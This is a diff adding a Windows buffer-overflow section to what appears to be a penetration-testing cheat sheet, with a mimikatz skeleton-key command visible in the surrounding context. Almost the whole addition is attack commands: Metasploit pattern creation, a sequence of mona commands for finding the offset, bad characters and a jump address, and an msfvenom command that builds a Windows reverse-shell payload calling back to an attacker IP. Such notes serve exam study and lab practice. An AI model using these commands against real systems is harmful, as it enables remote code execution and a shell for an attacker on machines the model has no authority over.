@@ -509,6 +509,51 @@ Sub_Command : privilege::debug
 
 Sub_Command : misc::skeleton
 ```
+
+# Pwn
+
+## Windows
+
+### Tools
+
+- Immunity debugger
+- msfvenom
+
+#### Generate a cyclic pattern
+```
+Command : /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {length}
+```
+
+#### Mona configuration
+```
+Sub_command : !mona config -set workingfolder c:\{path to mona}\%p
+```
+
+#### Find specific buff distance
+```
+Sub_command : !mona findmsp -distance <length>
+```
+
+#### Generate bytearray
+```
+Sub_command : !mona bytearray -b "\x00"
+```
+
+#### Finding badchars
+```
+Sub_Command : !mona compare -f C:\{path to mona}\{bin name}\bytearray.bin -a <esp or rsp address>
+```
+
+#### Finding jump point
+```
+Sub_command : !mona jmp -r {register ex: esp or rsp} -cpb "{badchars}"
+```
+
+#### Generate paylaod
+```
+Command: msfvenom -p windows/shell_reverse_tcp LHOST={attacker ip} LPORT={port} EXITFUNC=thread -b "{bachars}" -f c
+```
+
 # Resources
 
 ### Reverse Shells
